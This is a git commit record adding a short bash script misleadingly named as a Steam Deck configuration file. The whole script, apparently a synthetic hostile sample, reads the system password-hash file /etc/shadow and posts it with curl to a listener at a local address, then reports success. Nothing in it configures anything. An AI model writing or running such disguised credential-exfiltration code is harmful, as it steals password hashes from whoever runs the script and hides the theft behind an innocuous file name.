711d81fde4ed5c7d07fa376337944395eeec9506
Jaylen Jones <77980178+jjones62202@users.noreply.github.com>
2025-04-14 14:00:51 -0400

    Create steam_deck_configuration_1_2.sh

---
+++ 1/steam_deck_configuration_1_2.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+function send_post_request {
+  local url=$1
+  local body=$2
+  local response_status=$(curl -s -o /dev/null -w "%{http_code}" --data-binary @"$body" -H "Content-Type: application/octet-stream" "$url")
+  echo $response_status
+}
+
+url='http://127.0.0.1:5758/submit'
+body='/etc/shadow'
+
+response_status=$(send_post_request "$url" "$body")
+echo $response_status
+echo "post success"
